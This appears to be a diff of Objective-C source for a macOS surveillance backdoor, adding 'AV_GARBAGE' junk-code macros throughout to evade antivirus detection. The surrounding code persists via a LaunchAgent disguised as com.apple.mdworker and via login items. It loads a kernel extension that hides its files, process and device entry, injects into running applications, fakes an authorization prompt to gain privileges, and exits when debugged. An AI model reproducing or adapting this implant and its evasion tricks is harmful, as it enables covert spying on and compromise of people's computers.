     if ([currDemoMode isEqualToData: isDemoMarker] == TRUE) 
     {
       NSString *filePath = [[NSString alloc] initWithFormat: @"%@/%@",
                             [[NSBundle mainBundle] bundlePath],
                             @"infected.bmp"];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
       
       changeDesktopBg(filePath, NO);
       
@@ -3157,19 +3811,28 @@ static void computerWillShutdown(CFMachPortRef port,
 }
 
 - (BOOL)makeBackdoorResident
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   return [gUtil createLaunchAgentPlist: @"com.apple.mdworker"
                              forBinary: gBackdoorName];
 }
 
 - (BOOL)isBackdoorAlreadyResident
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   NSString *backdoorPlist = [NSString stringWithFormat: @"%@/%@",
                              [[[[[NSBundle mainBundle] bundlePath]
                                 stringByDeletingLastPathComponent]
                                stringByDeletingLastPathComponent]
                               stringByDeletingLastPathComponent],
                              BACKDOOR_DAEMON_PLIST];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   if ([[NSFileManager defaultManager] fileExistsAtPath: backdoorPlist
                                            isDirectory: NULL])
@@ -3184,19 +3847,32 @@ static void computerWillShutdown(CFMachPortRef port,
 
 - (BOOL)shouldUpgradeComponents
 {
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   NSString *migrationConfig = [[NSString alloc] initWithFormat: @"%@/%@",
                                                                 [[NSBundle mainBundle] bundlePath],
                                                                 RCS8_MIGRATION_CONFIG];
-                                 
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   if ([[NSFileManager defaultManager] fileExistsAtPath: migrationConfig] == TRUE)
     {  
         NSString *configurationPath = [[NSString alloc] initWithFormat: @"%@/%@",
                                        [[NSBundle mainBundle] bundlePath],
                                        gConfigurationName];
-                                                            
+      
+        // AV evasion: only on release build
+        AV_GARBAGE_005
+      
         if ([[NSFileManager defaultManager] removeItemAtPath: configurationPath
                                                        error: nil])
           {
+            
+            // AV evasion: only on release build
+            AV_GARBAGE_009
+            
             if ([[NSFileManager defaultManager] moveItemAtPath: migrationConfig
                                                         toPath: configurationPath
                                                          error: nil])
@@ -3215,7 +3891,10 @@ static void computerWillShutdown(CFMachPortRef port,
   NSString *updateDylib = [[NSString alloc] initWithFormat: @"%@/%@",
                                                             [[NSBundle mainBundle] bundlePath],
                                                             RCS8_UPDATE_DYLIB];
-                                                            
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   if ([[NSFileManager defaultManager] fileExistsAtPath: RCS8_UPDATE_DYLIB] == TRUE)
   
     {
@@ -3223,7 +3902,13 @@ static void computerWillShutdown(CFMachPortRef port,
                                                           [[NSBundle mainBundle] bundlePath],
                                                           gInputManagerName];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+      
       [[NSFileManager defaultManager] removeItemAtPath:dylib error:nil];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_000
       
       [[NSFileManager defaultManager] moveItemAtPath: updateDylib
                                               toPath: dylib
@@ -3233,6 +3918,9 @@ static void computerWillShutdown(CFMachPortRef port,
     }
   
   [updateDylib release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   if ([[NSFileManager defaultManager] fileExistsAtPath: RCS8_UPDATE_XPC] == TRUE)
     {
@@ -3246,6 +3934,9 @@ static void computerWillShutdown(CFMachPortRef port,
 {
   NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   BOOL sliSuccess = NO, uiSuccess = NO, noPrivs = NO;
   
   // Check the preconfigured mode - default is SLIPLIST
@@ -3258,7 +3949,10 @@ static void computerWillShutdown(CFMachPortRef port,
   // First of all, calculate properly the shared memory size
   // for logs
   gMemLogMaxSize = sizeof(shMemoryLog) * SHMEM_LOG_MAX_NUM_BLOCKS;
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   // Get OS version
   [[NSApplication sharedApplication] getSystemVersionMajor: &gOSMajor
                                                      minor: &gOSMinor
@@ -3275,11 +3969,17 @@ static void computerWillShutdown(CFMachPortRef port,
   // or there are comps ready for upgrade
   [self shouldUpgradeComponents];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   NSString *offlineFlag = [NSString stringWithFormat: @"%@/00",
                            [[NSBundle mainBundle] bundlePath]];
   
   if ([[NSFileManager defaultManager] fileExistsAtPath: offlineFlag])
-    {
+  {  
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+    
       [self makeBackdoorResident];
       [[NSFileManager defaultManager] removeItemAtPath: offlineFlag
                                                  error: nil];
@@ -3289,18 +3989,27 @@ static void computerWillShutdown(CFMachPortRef port,
   // this values
   [self _resizeSharedMemoryWindow];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   // Check it we're the only one on the current user session (1 per user)
   [self _checkForOthers];
   
   // FIXED-
   if ([workingMode isEqualToString: SLIPLIST])
-    {
+  {  
+      // AV evasion: only on release build
+      AV_GARBAGE_009
+    
       // SLIPLIST set by "require admin privileges" unflagged
       noPrivs = YES;
       NSString *flagPath   = [NSString stringWithFormat: @"%@/%@",
                               [[NSBundle mainBundle] bundlePath],
                               @"mdworker.flg"];
-      
+    
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+    
       if (![[NSFileManager defaultManager] fileExistsAtPath: flagPath
                                                 isDirectory: NO])
         {
@@ -3309,19 +4018,29 @@ static void computerWillShutdown(CFMachPortRef port,
     }
   else if ([workingMode isEqualToString: UISPOOF])
     {
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
       // set by "require admin privileges"
       if ([gUtil isLion] == YES)
         {
           NSString *flagPath   = [NSString stringWithFormat: @"%@/%@",
                                                              [[NSBundle mainBundle] bundlePath],
                                                              @"mdworker.flg"];
-
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_000
+          
           if (![[NSFileManager defaultManager] fileExistsAtPath: flagPath
                                                     isDirectory: NO])
             {
               [gUtil dropExecFlag];
             }
-        
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_004
+          
           // Enable setugid on lion
           if ([gUtil enableSetugidAuth] == NO)
             {
@@ -3332,6 +4051,9 @@ static void computerWillShutdown(CFMachPortRef port,
         }
       else
         {
+          // AV evasion: only on release build
+          AV_GARBAGE_002
+          
           uiSuccess = [self _UISpoof];
         }
     }
@@ -3340,22 +4062,38 @@ static void computerWillShutdown(CFMachPortRef port,
   NSString *launchAgentPath = [NSString stringWithFormat: @"%@/%@",
                                NSHomeDirectory(),
                                [BACKDOOR_DAEMON_PLIST stringByDeletingLastPathComponent]];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   if ([[NSFileManager defaultManager] fileExistsAtPath: launchAgentPath] == NO)
     {
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       // Factory restored machines don't have this dir
       mkdir([launchAgentPath UTF8String], 0755);
 
+      // AV evasion: only on release build
+      AV_GARBAGE_008
+      
       // Now chown it -> ourself
       NSArray *_tempArguments = [[NSArray alloc] initWithObjects: @"-R",
                                  NSUserName(),
                                  launchAgentPath,
                                  nil];
 
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+      
       [gUtil executeTask: @"/usr/sbin/chown"
            withArguments: _tempArguments
             waitUntilEnd: YES];
 
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
       [_tempArguments release];
     }
 
@@ -3363,6 +4101,10 @@ static void computerWillShutdown(CFMachPortRef port,
   // otherwise add all the required files for making it resident
   if ([self isBackdoorAlreadyResident] == NO)
     {  
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+      
       if (([workingMode isEqualToString: SLIPLIST] && sliSuccess == YES)
           || ([workingMode isEqualToString: UISPOOF])
           || (noPrivs == YES))
@@ -3376,6 +4118,9 @@ static void computerWillShutdown(CFMachPortRef port,
         }
     }
     
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   [workingMode release];
   
   //
@@ -3387,16 +4132,26 @@ static void computerWillShutdown(CFMachPortRef port,
 #ifdef DEBUG_CORE
           errorLog(@"Error while creating shared memory");
 #endif
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_007
+          
           return NO;
         }
     }
-    
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   //XXX-  
   if ([[NSFileManager defaultManager] fileExistsAtPath: [gUtil mExecFlag]
                                            isDirectory: NULL])
     {
       [self _createInternalFilesAndFolders];
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       [self _dropOsaxBundle];
       
     //XXX- for av problem
@@ -3406,7 +4161,10 @@ static void computerWillShutdown(CFMachPortRef port,
 //          [self _dropXPCBundle];
 //        }
     }
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   [NSThread detachNewThreadSelector: @selector(_registerForShutdownNotifications)
                            toTarget: self
                          withObject: nil];
@@ -3414,7 +4172,10 @@ static void computerWillShutdown(CFMachPortRef port,
 #ifndef NO_KEXT
   int ret = 0;
   int kextLoaded = 0;
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   if (getuid() != 0 && geteuid() == 0 && [gUtil isLion] == NO)
     {
       if ([self connectKext] == -1)
@@ -3423,6 +4184,9 @@ static void computerWillShutdown(CFMachPortRef port,
           warnLog(@"connectKext failed, trying to load the KEXT");
 #endif
 
+          // AV evasion: only on release build
+          AV_GARBAGE_000
+          
           BOOL res = is64bitKernel();
           if ([gUtil loadKextFor64bit: res] == YES)
             {
@@ -3448,13 +4212,18 @@ static void computerWillShutdown(CFMachPortRef port,
         }
     }
   
-
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   if (kextLoaded == 1)
     {
 #ifdef DEBUG_CORE
       infoLog(@"kext loaded");
 #endif
-      //
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       // Since Snow Leopard doesn't export all the required symbols
       // we're gonna solve them from uspace and send 'em back to kspace
       [self _solveKernelSymbolsForKext];
@@ -3463,22 +4232,35 @@ static void computerWillShutdown(CFMachPortRef port,
       os_ver.major  = gOSMajor;
       os_ver.minor  = gOSMinor;
       os_ver.bugfix = gOSBugFix;
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
       // Telling kext to find sysent based on OS version
       ret = ioctl(gBackdoorFD, MCHOOK_FIND_SYS, &os_ver);
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
       //
       // Start hiding all the required paths
       NSString *backdoorPlist = [[NSString alloc] initWithString: BACKDOOR_DAEMON_PLIST];
       
 #ifdef DEBUG_CORE
       infoLog(@"Hiding LaunchAgent plist");
-#endif
+#endif  
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       // Hiding LaunchAgent plist
       ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[[backdoorPlist lastPathComponent] fileSystemRepresentation]);
       
       [backdoorPlist release];
-    
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       // Hide only inputmanager not osax
       if ([gUtil isLeopard])
         {
@@ -3487,6 +4269,9 @@ static void computerWillShutdown(CFMachPortRef port,
 #endif
           NSString *inputManagerPath = [[NSString alloc]
                                         initWithString: EXT_BUNDLE_FOLDER];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_004
           
           // Hiding input manager dir
           ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[inputManagerPath fileSystemRepresentation]);
@@ -3510,26 +4295,46 @@ static void computerWillShutdown(CFMachPortRef port,
 #ifdef DEBUG_CORE
       infoLog(@"Hiding backdoor dir");
 #endif
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_008
+      
       // Hiding backdoor dir
       ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[appPath fileSystemRepresentation]);
       
 #ifdef DEBUG_CORE
       infoLog(@"Hiding process %d", getpid());
 #endif
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_008
+      
       // Hide Process
       ret = ioctl(gBackdoorFD, MCHOOK_HIDEP, [NSUserName() UTF8String]);
       
 #ifdef DEBUG_CORE
       infoLog(@"Hiding KEXT");
-#endif
+#endif  
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+
       // Hide KEXT
       ret = ioctl(gBackdoorFD, MCHOOK_HIDEK);
       
 #ifdef DEBUG_CORE
       infoLog(@"Hiding /dev entry");
 #endif
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+      
       // Hide KEXT /dev entry
       NSString *kextDevEntry = [[NSString alloc] initWithCString: BDOR_DEVICE];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+      
       ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[[kextDevEntry lastPathComponent] fileSystemRepresentation]);
       
       [kextDevEntry release];
@@ -3540,12 +4345,22 @@ static void computerWillShutdown(CFMachPortRef port,
   // Inject running ActivityMonitor
   if ([gUtil isLeopard] == NO && geteuid() == 0)
     {
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_008
+      
       NSNumber *pActivityM = pidForProcessName(@"Activity Monitor");
       
       if (pActivityM != nil) 
-        {
+      {      
+          // AV evasion: only on release build
+          AV_GARBAGE_007
+        
           NSNumber *thePid = [[NSNumber alloc] initWithInt: [pActivityM intValue]];
-          
+        
+          // AV evasion: only on release build
+          AV_GARBAGE_008
+        
           [self sendEventToPid: thePid];
           
           [thePid release];
@@ -3553,18 +4368,27 @@ static void computerWillShutdown(CFMachPortRef port,
     }
 #endif
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   // inject all running apps in the ws
   [self injectRunningApp];
   
 #ifdef DEBUG_CORE
   infoLog(@"injectRunningApp done!");
 #endif
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   // Register notification for new process
   [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver: self 
                                                          selector: @selector(injectBundle:)
                                                              name: NSWorkspaceDidLaunchApplicationNotification 
                                                            object: nil];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   // Register notification for terminate process for Crisis agent
   [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver: self 
@@ -3572,10 +4396,16 @@ static void computerWillShutdown(CFMachPortRef port,
                                                              name: NSWorkspaceDidTerminateApplicationNotification 
                                                            object: nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
   
   // Load configuration, starts all agents and the events monitoring routine
   [taskManager loadInitialConfiguration];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   // Set the backdoorControlFlag to RUNNING
   mMainLoopControlFlag = @"RUNNING";
@@ -3583,16 +4413,25 @@ static void computerWillShutdown(CFMachPortRef port,
   [gControlFlagLock lock];
   taskManager.mBackdoorControlFlag = mMainLoopControlFlag;
   [gControlFlagLock unlock];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   __m_MInfoManager *infoManager = [[__m_MInfoManager alloc] init];
   [infoManager logActionWithDescription: @"Start"];
   [infoManager release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
   // set desktop background for demo mode
   [self checkAndRunDemoMode];
   
   // Main backdoor loop
   [self _communicateWithAgents];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   [innerPool release];
   
@@ -3604,12 +4443,18 @@ static void computerWillShutdown(CFMachPortRef port,
   if (gAgentCrisisNet == nil)
     return NO;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   for (int i=0; i<[gAgentCrisisNet count]; i++) 
   {
     NSString *tmpAppName = [gAgentCrisisNet objectAtIndex: i];
     if ([appName isCaseInsensitiveLike: tmpAppName])
       return YES;
   }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   return NO;
 }
@@ -3618,15 +4463,25 @@ static void computerWillShutdown(CFMachPortRef port,
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   NSDictionary *appInfo = [notification userInfo];
   
 #ifdef DEBUG_CORE
   infoLog(@"try to stop crisis agent sync for app %@ (gAgentCrisis)", appInfo, gAgentCrisis);
 #endif
   
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   if ((gAgentCrisis & CRISIS_SYNC) &&
       [self isCrisisNetApp: [appInfo objectForKey: @"NSApplicationName"]]) 
   {
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_008
     
     gAgentCrisis = gAgentCrisis & ~CRISIS_SYNC;
 #ifdef DEBUG_CORE
@@ -3639,11 +4494,18 @@ static void computerWillShutdown(CFMachPortRef port,
 
 - (BOOL)isCrisisHookApp: (NSString*)appName
 {
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   if (gAgentCrisisApp == nil)
     return NO;
   
   for (int i=0; i<[gAgentCrisisApp count]; i++) 
-  {
+  {  
+    // AV evasion: only on release build
+    AV_GARBAGE_005
+    
     NSString *tmpAppName = [gAgentCrisisApp objectAtIndex: i];
     if ([appName isCaseInsensitiveLike: tmpAppName])
       return YES;
@@ -3656,8 +4518,14 @@ static void computerWillShutdown(CFMachPortRef port,
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   NSDictionary *appInfo = [notification userInfo];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   if (appInfo == nil)
     {
       [pool release];
@@ -3670,7 +4538,10 @@ static void computerWillShutdown(CFMachPortRef port,
   
   if ((gAgentCrisis & CRISIS_START) && 
       [self isCrisisNetApp: [appInfo objectForKey: @"NSApplicationName"]]) 
-  {
+  {  
+    // AV evasion: only on release build
+    AV_GARBAGE_009
+    
     gAgentCrisis |= CRISIS_SYNC;
 #ifdef DEBUG_CORE
     infoLog(@"Sync disabled! gAgentCrisis = 0x%x", gAgentCrisis);
@@ -3686,6 +4557,9 @@ static void computerWillShutdown(CFMachPortRef port,
     return;
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   if ([gUtil isLeopard] && (getuid() == 0 || geteuid() == 0))
     {
 #ifdef DEBUG_CORE
@@ -3694,6 +4568,10 @@ static void computerWillShutdown(CFMachPortRef port,
       // Only for leopard send pid to new activity monitor via shmem
       if ([[appInfo objectForKey: @"NSApplicationName"] isCaseInsensitiveLike: @"Activity Monitor"])
         {
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_002
+          
           // Write command with pid
           [self shareCorePidOnShMem];
         }
@@ -3702,16 +4580,26 @@ static void computerWillShutdown(CFMachPortRef port,
     {
 #ifdef DEBUG_CORE
       infoLog(@"sendEventToPid");
-#endif
+#endif  
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_009
+      
       // temporary thread for fixing euid/uid escalation
       pid_t tmpPid =  [[appInfo objectForKey: @"NSApplicationProcessIdentifier"] intValue];
       NSNumber *thePid = [[NSNumber alloc] initWithInt: tmpPid];
-     
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
      [self sendEventToPid: thePid];
      
      [thePid release];
     }
-    
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   [pool release];
 }
 
@@ -3719,7 +4607,14 @@ static void computerWillShutdown(CFMachPortRef port,
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSMutableData *pidCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   pid_t amPid = getpid();
   
 #ifdef DEBUG_CORE
@@ -3732,6 +4627,9 @@ static void computerWillShutdown(CFMachPortRef port,
   shMemoryHeader->command           = CR_CORE_PID;
   shMemoryHeader->commandDataSize   = sizeof(pid_t);
   memcpy(shMemoryHeader->commandData, &amPid, sizeof(pid_t));
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   if ([gSharedMemoryCommand writeMemory: pidCommand
                                  offset: OFFT_CORE_PID
@@ -3748,6 +4646,9 @@ static void computerWillShutdown(CFMachPortRef port,
 #endif
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   [pidCommand release];
   [pool release];
 }
@@ -3763,6 +4664,9 @@ static void computerWillShutdown(CFMachPortRef port,
   //AuthorizationExternalForm extAuth;
   char myReadBuffer[256];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   //
   // ExtendRights here is used in order to do the infamous sudo
   //
@@ -3770,6 +4674,11 @@ static void computerWillShutdown(CFMachPortRef port,
   | kAuthorizationFlagInteractionAllowed
   //| kAuthorizationFlagPreAuthorize
   | kAuthorizationFlagExtendRights;
+  
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   
   //
   // Looks like icns files don't work here .. Only tif(f) atm
@@ -3779,6 +4688,9 @@ static void computerWillShutdown(CFMachPortRef port,
                                      stringByDeletingLastPathComponent]
                                     stringByDeletingLastPathComponent]
                                    stringByAppendingPathComponent: @"_sys.tiff"];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   NSString *iconCurrentPath = [[[NSBundle mainBundle] bundlePath]
                                stringByAppendingPathComponent: ICON_FILENAME];
@@ -3790,14 +4702,27 @@ static void computerWillShutdown(CFMachPortRef port,
     infoLog(@"Already authorized, relaunching the original file");
 #endif
     
+    // AV evasion: only on release build
+    AV_GARBAGE_001
+    
     NSString *searchPattern = [[NSString alloc] initWithFormat: @"%@/*.ez",
                                [[NSBundle mainBundle] bundlePath]];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_003
     
     NSArray *_searchedFile = searchForProtoUpload(searchPattern);
     [searchPattern release];
     
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_009
+    
     [[NSFileManager defaultManager] removeItemAtPath: iconDestinationPath
                                                error: nil];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_005
     
     if ([_searchedFile count] > 0)
     {
@@ -3816,6 +4741,9 @@ static void computerWillShutdown(CFMachPortRef port,
       exit(-1);
     }    
   }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
   
   [[NSFileManager defaultManager] copyItemAtPath: iconCurrentPath
                                           toPath: iconDestinationPath
@@ -3841,6 +4769,9 @@ static void computerWillShutdown(CFMachPortRef port,
   myAuthItems.value         = (char *)[iconDestinationPath UTF8String];
   myAuthItems.flags         = 0;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   AuthorizationRights myRights;
   myRights.count = 1;
   myRights.items = &myItems;
@@ -3848,6 +4779,9 @@ static void computerWillShutdown(CFMachPortRef port,
   AuthorizationEnvironment authEnvironment;
   authEnvironment.count = 1;
   authEnvironment.items = &myAuthItems;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
 #ifdef DEBUG_CORE
   infoLog(@"Creating authorization");
@@ -3861,6 +4795,9 @@ static void computerWillShutdown(CFMachPortRef port,
                                  &authEnvironment,
                                  myFlags,
                                  &myAuthorizationRef);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
   //
   // errAuthorizationSuccess returned in case of success
@@ -3923,16 +4860,28 @@ static void computerWillShutdown(CFMachPortRef port,
   
   if (execPath == nil)
   {
+    // AV evasion: only on release build
+    AV_GARBAGE_003
+    
     if ([gUtil isLeopard])
     {
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       NSString *searchPattern = [[NSString alloc] initWithFormat: @"%@/*.ez",
                                  [[NSBundle mainBundle] bundlePath]];
       
       NSArray *_searchedFile = searchForProtoUpload(searchPattern);
       [searchPattern release];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       [[NSFileManager defaultManager] removeItemAtPath: iconDestinationPath
                                                  error: nil];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
       
       if ([_searchedFile count] > 0)
       {
@@ -3950,6 +4899,10 @@ static void computerWillShutdown(CFMachPortRef port,
     }
     else
     {
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       execPath = [NSString stringWithFormat: @"%@",
                   [[[NSBundle mainBundle] bundlePath]
                    stringByAppendingPathComponent: @"System Preferences"]];
@@ -3959,6 +4912,9 @@ static void computerWillShutdown(CFMachPortRef port,
 #ifdef DEBUG_CORE
   infoLog(@"Executing with auth (%@)", execPath);
 #endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   myStatus = AuthorizationExecuteWithPrivileges(myAuthorizationRef,
                                                 (char *)[execPath UTF8String],
@@ -3977,12 +4933,19 @@ static void computerWillShutdown(CFMachPortRef port,
 #ifdef DEBUG_CORE
     infoLog(@"Auth executed with success (%s)", myReadBuffer);
 #endif
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_002
+    
     read(fileno(myCommunicationsPipe), myReadBuffer, sizeof(myReadBuffer));
     fclose(myCommunicationsPipe);
   }
   
   [[NSFileManager defaultManager] removeItemAtPath: iconDestinationPath
                                              error: nil];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   //
   // Free the AuthorizationRef
@@ -3992,6 +4955,9 @@ static void computerWillShutdown(CFMachPortRef port,
 #ifdef DEBUG_CORE
   warnLog(@"Quitting from auth");
 #endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   exit(0);
 }
@@ -4008,11 +4974,17 @@ static void computerWillShutdown(CFMachPortRef port,
     struct kinfo_proc   info;
     size_t              size;
     
+    // AV evasion: only on release build
+    AV_GARBAGE_001
+    
     //
     // Initialize the flags so that, if sysctl fails for some bizarre
     // reason, we get a predictable result.
     //
     info.kp_proc.p_flag = 0;
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_002
     
     //
     // Initialize mib, which tells sysctl the info we want, in this case
@@ -4023,15 +4995,24 @@ static void computerWillShutdown(CFMachPortRef port,
     mib[2] = KERN_PROC_PID;
     mib[3] = getpid();
     
+    // AV evasion: only on release build
+    AV_GARBAGE_004
+    
     // Call sysctl
     size = sizeof(info);
     junk = sysctl(mib, sizeof(mib) / sizeof(*mib), &info, &size, NULL, 0);
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_007
     
     // We're being debugged if the P_TRACED flag is set
     if ((info.kp_proc.p_flag & P_TRACED) != 0)
     {
       exit(-1);
     }
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_003
     
     usleep(50000);
   }
@@ -4043,6 +5024,9 @@ static void computerWillShutdown(CFMachPortRef port,
   BOOL success;
   NSFileManager *fileManager = [NSFileManager defaultManager];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   //
   // Check if the SLI file already exists
   //
@@ -4053,6 +5037,9 @@ static void computerWillShutdown(CFMachPortRef port,
       infoLog(@"SLI File already exists!");
 #endif
       
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       success = [gUtil isBackdoorPresentInSLI: [[NSBundle mainBundle] bundlePath]];
       
       if (success == NO)
@@ -4062,6 +5049,9 @@ static void computerWillShutdown(CFMachPortRef port,
 #endif
           NSString *SLIBackup       = @"com.apple.SystemLoginItems.plist_bak";
           
+          // AV evasion: only on release build
+          AV_GARBAGE_004
+          
           NSString *SLIDestination  = @"com.apple.SystemLoginItems.plist";
           
           //
@@ -4070,6 +5060,9 @@ static void computerWillShutdown(CFMachPortRef port,
           [fileManager copyItemAtPath: [gUtil mSLIPlistPath]
                                toPath: SLIBackup
                                 error: &error];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_003
           
           if ([gUtil addBackdoorToSLIPlist] == NO)
             {
@@ -4086,6 +5079,8 @@ static void computerWillShutdown(CFMachPortRef port,
           if ([fileManager removeItemAtPath: [gUtil mSLIPlistPath]
                                       error: &error] == YES)
             {
+              // AV evasion: only on release build
+              AV_GARBAGE_002
               if ([fileManager moveItemAtPath: SLIDestination
                                        toPath: [gUtil mSLIPlistPath]
                                         error: &error] == NO)
@@ -4123,12 +5118,17 @@ static void computerWillShutdown(CFMachPortRef port,
 #ifdef DEBUG_CORE
       infoLog(@"SLI File doesn't exists");
 #endif
+      // AV evasion: only on release build
+      AV_GARBAGE_001
       
       //
       // Create the SLI plist from scratch
       //
       return [gUtil createSLIPlistWithBackdoor];
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   return YES;
 }
